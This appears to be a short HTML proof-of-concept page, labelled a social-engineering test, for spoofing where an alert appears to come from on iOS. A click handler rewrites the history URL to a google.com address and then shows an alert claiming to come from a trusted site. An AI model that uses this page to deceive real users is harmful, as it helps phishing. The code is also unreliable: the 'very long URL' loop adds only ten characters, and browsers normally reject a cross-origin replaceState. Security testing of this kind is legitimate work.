<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iOS Social Engineering Test</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 20px;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <h2>Test Social Engineering - iOS Alert Spoofing</h2>
    <p>Click the button below to see the spoofed alert.</p>
    <button id="triggerAlert">Click me!</button>

    <script>
        const triggerAlertButton = document.getElementById("triggerAlert");

        triggerAlertButton.addEventListener("click", function() {
            // Create a very long URL string to replace the current history state
            let spoofedUrl = "https://google.com:90/";
            for (let i = 0; i < 10; i++) {
                spoofedUrl += "a";
            }

            // Use history.replaceState to spoof the URL (doesn't change the actual page)
            history.replaceState({}, "From this page", spoofedUrl);

            // Show the alert which will appear as coming from "this page"
            alert("This alert will appear to be from a trusted website, but it's triggered by a malicious page.");

            // Optionally, load a new page or trigger other behavior
            window.location.href = "about:blank"; // A new blank page
        });
    </script>
</body>
